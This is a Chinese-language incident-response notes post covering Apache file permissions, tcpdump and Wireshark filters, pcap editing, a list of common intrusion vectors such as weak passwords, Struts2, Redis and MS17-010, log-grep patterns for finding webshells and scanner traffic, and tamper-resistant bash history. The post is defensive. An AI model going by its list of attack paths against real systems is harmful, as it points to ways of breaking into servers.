&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/yuanqiao/p/4816843.html&quot;&gt;apache禁止访问文件或目录执行权限、禁止运行脚本PHP文件的设置方法&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/anxinliu2011/article/details/&quot;&gt;Tomcat用户权限设置&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;在ubuntu 安装完apache 之后，默认会往系统中增加www-data 用户 和 www-data 用户组。
同样你可以用 ps -ef | grep apache 查看 apache 进程，你会发现apache的。&lt;/p&gt;

&lt;p&gt;这样你就可以理解为这个apache服务器运行的用户和用户组是www-data,假设网站的用户为demo,项目的目录为/var/www/html/demo&lt;/p&gt;

&lt;p&gt;接下来就分几个步骤来设置(用root用户执行下面的命令)：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.首先把网站的的目录和文件的所有者设置为demo,所属组设置为www-data ，对与Linux命令不熟悉的，可以到网上查询。

chown -R demo:www-data /var/www/html/demo
2.设置网站目录权限为750，750是demo这个用户对目录拥有读写执行的权限，这样demo用户可以在任何目录下创建文件，用户组有有读执行权限，这样就有进入目录的权限，其它用户没有任何权限。

chmod 750 /var/www/html/demo
cd  /var/www/html/demo
find -type d -exec chmod 750 {} \;
3.设置网站文件权限为640，640指只有demo用户对网站文件有更改的权限，apache服务器只有读取文件的权限，无法更改文件，其它用户无任何权限。

find -not -type d -exec chmod 640 {} \;
4.需要针对个别目录来设置权限，以Thinkphp为例，它的Runtime 目录存储的有日志文件，还有与数据库做ORM映射的数据库表信息，这说明apache服务器要对这些目录

有访问的权限，并且对于线面的日志文件有写入的权限，那么这样就需要对于这些特殊目录设置。

cd /var/www/html/demo
find . -name &quot;Runtime&quot; -type d -exec chmod -R 770 {} \;
执行上面的命令请注意 “{}”与 “\”之间是有空格的，上面的-R参数是递归给Runtime 目录下面的目录和文件赋予 770 权限，当然了你会说日志文件是不需要执行权限的，

不过这里没关系，当你把日志文件删除掉之后，生成出来的文件是没执行权限的。因为当你把日志文件删除掉之后，那么生成日志文件的的用户和所有者都是www-data。

这样整个站点你就可以通过这种方式管理起来了。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;简单的抓包命令&quot;&gt;简单的抓包命令&lt;/h4&gt;

&lt;p&gt;抓取所有经过 eth2 目的或源地址是 192.168.1.2 的网络数据 ，并且保存到XX.pcap文件中&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tcpdump   -i  eth2 host 192.168.1.2    -w   xx.pcap
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;抓取所有经过 eth2，目的地址是 192.168.1.2 的网络数据，并且保存到XX.pcap文件中&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tcpdump   -i  eth2  dst host 192.168.1.2    -w   xx.pcap
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;抓取所有经过 eth1，源地址是 192.168.1.2 的网络数据，并且保存到XX.pcap文件中&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tcpdump   -i  eth2  dst host 192.168.1.2    -w   xx.pcap
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;抓取网口1 源端口是25的数据，保存到xx.pcap中&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# tcpdump -i eth1 src port 25  -w   xx.pcap
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;抓取网口1 目的端口是25的数据，保存到xx.pcap中&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# tcpdump -i eth1 dst port 25  -w   xx.pcap
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;抓整个包：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#tcpdump -X -s 0 host 192.168.1.12
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;抓68字节：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#tcpdump -X host 192.168.1.12
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;对应的端口抓包：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#tcpdump -X udp port 1812
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;wireshak工具抓包：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wireshak工具抓包
tcp.port == 6789

过滤源ip、目的ip。在wireshark的过滤规则框Filter中输入过滤条件。如查找目的地址为192.168.101.8的包，ip.dst==192.168.101.8；查找源地址为ip.src==1.1.1.1；

使用wireshark常用的过滤命令
端口过滤。如过滤80端口，在Filter中输入，tcp.port==80，这条规则是把源端口和目的端口为80的都过滤出来。使用tcp.dstport==80只过滤目的端口为80的，tcp.srcport==80只过滤源端口为80的包；

使用wireshark常用的过滤命令
协议过滤比较简单，直接在Filter框中直接输入协议名即可，如过滤HTTP的协议；

使用wireshark常用的过滤命令
http模式过滤。如过滤get包，http.request.method==&quot;GET&quot;,过滤post包，http.request.method==&quot;POST&quot;；

使用wireshark常用的过滤命令
连接符and的使用。过滤两种条件时，使用and连接，如过滤ip为192.168.101.8并且为http协议的，ip.src==192.168.101.8 and http。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;pcap文件过滤和合并：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;通过 editcap， 我们能以很多不同的规则来过滤 pcap 文件中的内容，并且将过滤结果保存到新文件中。

首先，以“起止时间”来过滤 pcap 文件。 &quot; - A &amp;lt; start-time &amp;gt; 和 &quot; - B &amp;lt; end-time &amp;gt; 选项可以过滤出在这个时间段到达的数据包（如，从 2:30 ～ 2:35）。时间的格式为 “ YYYY-MM-DD HH:MM:SS&quot;。

$ editcap -A '2014-12-10 10:11:01'-B '2014-12-10 10:21:01' input.pcap output.pcap
也可以从某个文件中提取指定的 N 个包。下面的命令行从 input.pcap 文件中提取100个包（从 401 到 500）并将它们保存到 output.pcap 中：

$ editcap input.pcap output.pcap 401-500
使用 &quot;-D &amp;lt; dup-window &amp;gt;&quot; （dup-window可以看成是对比的窗口大小，仅与此范围内的包进行对比）选项可以提取出重复包。每个包都依次与它之前的 &amp;lt; dup-window &amp;gt; -1 个包对比长度与MD5值，如果有匹配的则丢弃。

$ editcap -D 10 input.pcap output.pcap
遍历了 37568 个包, 在 10 窗口内重复的包仅有一个，并丢弃。

也可以将 &amp;lt; dup-window &amp;gt; 定义成时间间隔。使用&quot;-w &amp;lt; dup-time-window &amp;gt;&quot;选项，对比&amp;lt; dup-time-window &amp;gt; 时间内到达的包。

$ editcap -w 0.5 input.pcap output.pcap
检索了 50000 个包, 以0.5s作为重复窗口，未找到重复包。

分割 pcap 文件
当需要将一个大的 pcap 文件分割成多个小文件时，editcap 也能起很大的作用。

将一个 pcap 文件分割成数据包数目相同的多个文件

$ editcap -c &amp;lt;packets-per-file&amp;gt;&amp;lt;input-pcap-file&amp;gt;&amp;lt;output-prefix&amp;gt;
输出的每个文件有相同的包数量，以 &amp;lt; output-prefix &amp;gt;-NNNN的形式命名。

以时间间隔分割 pcap 文件

$ editcap -i &amp;lt;seconds-per-file&amp;gt;&amp;lt;input-pcap-file&amp;gt;&amp;lt;output-prefix&amp;gt;
合并 pcap 文件
如果想要将多个文件合并成一个，用 mergecap 就很方便。

当合并多个文件时，mergecap 默认将内部的数据包以时间先后来排序。

$ mergecap -w output.pcap input.pcap input2.pcap [input3.pcap ...]
如果要忽略时间戳，仅仅想以命令行中的顺序来合并文件，那么使用 -a 选项即可。

例如，下列命令会将 input.pcap 文件的内容写入到 output.pcap, 并且将 input2.pcap 的内容追加在后面。

$ mergecap -a -w output.pcap input.pcap input2.pcap
总结
在这篇指导中，我演示了多个 editcap、 mergecap 操作 pcap 文件的例子。除此之外，还有其它的相关工具，如 reordercap用于将数据包重新排序，text2pcap 用于将 pcap 文件转换为文本格式， pcap-diff用于比较 pcap 文件的异同，等等。当进行网络入侵测试及解决网络问题时，这些工具与包注入工具非常实用，所以最好了解他们.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;入侵方式分析&quot;&gt;入侵方式分析&lt;/h3&gt;

&lt;p&gt;滚雪球式线性拓展&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a) 密码口令类拓展（远控）

b) 典型漏洞批量利用
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;常见的入侵方式Getshell方法&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a) WEB入侵
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;滚雪球式线性拓展&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a) 密码口令类拓展（远控）

b) 典型漏洞批量利用
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;常见的入侵方式Getshell方法&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a) WEB入侵
i. 典型漏洞：注入Getshell , 上传Getshell，命令执行Getshell，文件包含Getshell，代码执行Getshell，编辑器getshell，后台管理Getshell，数据库操作Getshell
ii. 容器相关：Tomcat、Axis2、WebLogic等中间件弱口令上传war包等，Websphere、weblogic、jboss反序列化，Struts2代码执行漏洞，Spring命令执行漏洞
b) 系统入侵
i. SSH 破解后登录操作
ii. RDP 破解后登录操作
iii. MSSQL破解后远控操作
iv. SMB远程命令执行（MS08-067、MS17-010、CVE-2017-7494）
c) 典型应用

i. Mail暴力破解后信息挖掘及漏洞利用
ii. VPN暴力破解后绕过边界
iii. Redis 未授权访问或弱口令可导ssh公钥或命令执行
iv. Rsync 未授权访问类
v. Mongodb未授权访问类
vi. Elasticsearch命令执行漏洞
vii. Memcache未授权访问漏洞
viii. 服务相关口令（mysql ldap zebra squid vnc smb）
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;应急大致流程&quot;&gt;应急大致流程&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;询问（问：1.当前情况。主要是问当前发现了哪些异常；2.服务器组件部署情况；3.是否处于内网环境？是否还有其他关联服务器？4.如果当前服务器上部署了web应用还需要问这个项目是否经过安全测试？）&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;事件处理
需要依据对项目组询问的结果进行排查，心里大概列出攻击者可能通过哪几条路进来并且在心里进行排序。这块的依据是基础知识那块的第二点，能不能快速的找到问题取决于你是否了解常见的攻击套路。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;初步对事件进行判断，是否需要关停业务或者是否需要隔离被攻击主机，是否需要对被攻击主机进行断网等等，防止损失/危害进一步扩大。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;建讨论组。拉相关人员进组方便沟通交流（一般包括：项目组运维、开发、领导、我方的事件处理人员、领导）&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;依据上一步的排序结果进行对应日志调取，需要注意的是：日志不要在线上服务器进行分析，将线上日志打包下载回本地。不要在线上服务器进行任何多余的操作，操作的时候要小心小心再小心。可以让项目组的韵味取日志之后再发给你。对日志进行分析（考虑到我们这边项目的特征一般采用Linux下shell分析的方式，对于windows自带的事件日志一般采用splunk或者windows自带的日志分析工具或者log parser）比如通过询问了解到这台被黑的服务器用到了tomcat并且manager也存在弱口令，那么你首先需要调取的就是tomcat的日志，因为tomcat manager的入侵是需要上传war包，所以你的语句应该是：
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat log.log | grep -i &quot;.war&quot;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;如果上一步骤中你找到了异常的war包（看文件名看上传时间）那么需要在服务器中找到这个war包下载到本地进行分析（主要分析是否是恶意的war包，如果是他的主要作用是什么）依据war包第一次上传的时间为准通过日志整理出攻击者的攻击时间线，依据时间线进行整体的入侵行为分析。分析攻击者在这个时间段内做了什么。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;如果被黑服务器处在内网还需要对内网其他服务器进行分析，是否存在被黑的情况，重点关注和被黑服务器共享同一密码的服务器。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;如果服务器中存在恶意的二进制文件，需要对二进制文件进行分析。使用IDA Pro对恶意文件进行静态分析，使用在线文件分析平台（金山火眼、文件B超、virustotal等等）对恶意文件进行动态分析。结合两者的分析结果判定恶意文件的行为，例如是否会对服务器系统文件进行替换？是否感染了系统其他关键文件？是否将自身写入开机启动项？同时可以将恶意文件的md5值放到网上搜索看看有没有人已经对该恶意文件进行过分析。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;确定此次事件的影响大小。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;报告&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;基本应急建议&quot;&gt;基本应急建议&lt;/h3&gt;

&lt;p&gt;Kill恶意进程：&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;32位用wsyscheck，从自启动、服务里找，最重要的是杀白金这类注入进程的需要他的卸载模块功能，你kill进程立即重启。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;64位任务管理器加注册表编辑器足够了，右键转至服务非常好用，除了挖矿的，其他的木马后门都会*32，直接kill，kill不了的注册表里改了然后重启。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;WEBSHELL寻找：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;1）扫描特征
通常日志中会伴随一些其他攻击特征，例如可以用如下语句
egrep ‘(select|script|acunetix|sqlmap)’ /var/log/httpd/access_log&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;2）访问频次
重点关注POST请求
grep ‘POST’ /var/log/httpd/access_log | awk ‘{print $1}’ | sort | uniq -c | sort -nr&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;3）Content-Length
Content-Length过大的请求，例如过滤Content-Length大于5M的日志
awk ‘{if($10&amp;gt;5000000){print $0}}’ /var/log/httpd/access_log&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;注意
这里如果发现文件，不要直接用vim查看编辑文件内容，这样会更改文件的mtime，而对于应急响应来说，时间点很重要。对比时间点更容易在Log找到其他的攻击痕迹。&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;基本建议：&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;C:\Users\XXX\Desktop 新建用户的桌面，可能会有残留文件
查看杀毒软件日志
查看安全性日志，是否存在大量审核失败的日志（暴力破解）若该帐号本身已被删除，则”用户”处将不会显示帐号名，而是显示一串帐号的SID值。
查看安全性日志，特殊事件，比如说648特殊事件为创建账户事件&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;这里列举一些有关检测时常见的事件ID:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;事件ID：517     审核日志已经清除
事件ID：528     登陆成功                      可以显示客户端连接ip地址
事件ID：529   登录失败。试图使用未知的用户名或已知用户名但错误密码进行登录
事件ID：683     会话从 winstation 中断连接     可以查看客户端计算机名
事件ID：624     创建了用户帐户
事件ID：626     启用了用户帐户
事件ID：627     用户密码已更改
事件ID：628     设置了用户密码
事件ID：630   用户帐户已删除。
事件ID：632： 成员已添加至全局组
事件ID：635： 已新建本地组。 
事件ID：643： 域策略已修改。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;必要时配置下history&lt;/p&gt;

&lt;p&gt;1、命令历史记录中加时间&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;默认情况下如下图所示，没有命令执行时间，不利于审计分析。

通过设置export HISTTIMEFORMAT='%F %T '，让历史记录中带上命令执行时间。

注意”%T”和后面的”’”之间有空格，不然查看历史记录的时候，时间和命令之间没有分割。

要一劳永逸，这个配置可以写在/etc/profile中，当然如果要对指定用户做配置，这个配置可以写在/home/$USER/.bash_profile中。

本文将以/etc/profile为例进行演示。

要使配置立即生效请执行source /etc/profile，我们再查看history记录，可以看到记录中带上了命令执行时间。

如果想要实现更细化的记录，比如登陆过系统的用户、IP地址、操作命令以及操作时间一一对应，可以通过在/etc/profile里面加入以下代码实现

export HISTTIMEFORMAT=&quot;%F %T 'who -u am i 2&amp;gt;/dev/null| awk '{print $NF}'|sed -e 's/[()]//g ''whoami' &quot;，注意空格都是必须的。

修改/etc/profile并加载后，history记录如下，时间、IP、用户及执行的命令都一一对应。

通过以上配置，我们基本上可以满足日常的审计工作了，但了解系统的朋友应该很容易看出来，这种方法只是设置了环境变量，攻击者unset掉这个环境变量，或者直接删除命令历史，对于安全应急来说，这无疑是一个灾难。

针对这样的问题，我们应该如何应对，下面才是我们今天的重点，通过修改bash源码，让history记录通过syslog发送到远程logserver中，大大增加了攻击者对history记录完整性破坏的难度。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;2、修改bash源码，支持syslog记录&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;首先下载bash源码，可以从gnu.org下载，这里不做详细说明了，系统需要安装gcc等编译环境。我们用bash4.4版本做演示。

修改源码：bashhist.c

修改源码config-top.h，取消/#define SYSLOG_HISTORY/这行的注释

编译安装，编译过程不做详细说明，本文中使用的编译参数为： ./configure –prefix=/usr/local/bash，安装成功后对应目录如下：

此时可以修改/etc/passwd中用户shell环境，也可以用编译好的文件直接替换原有的bash二进制文件，但最好对原文件做好备份。

替换时要注意两点:

1、一定要给可执行权限，默认是有的，不过有时候下载到windows系统后，再上传就没有可执行权限了，这里一定要确定，不然你会后悔的；

2、替换时原bash被占用，可以修改原用户的bash环境后再进行替换。

查看效果，我们发现history记录已经写到了/var/log/message中。

如果要写到远程logserver，需要配置syslog服务，具体配置这里不做详细讲解，大家自己研究，发送到远端logserver效果如下图所示。

通过以上手段，可以有效保证history记录的完整性，避免攻击者登录系统后，通过取消环境变量、删除history记录等方式抹掉操作行为，为安全审计、应急响应等提供了完整的原始数据
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;后记&quot;&gt;后记&lt;/h4&gt;

&lt;p&gt;本文将持续更新，将作者遇到的一些应急的内容和技巧添加到里面，其中有部分内容参考了各大安全论坛的资料，再次感谢其他作者的付出。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="pentest" /><summary type="html">在我们工作过程中，难免会遇到一些需要应急响应的事件。在紧急情况下，某些平时的苦工可能会帮助我们简化流程。这里做下应急方面的笔记，列出一些实用的小技巧。</summary></entry></feed>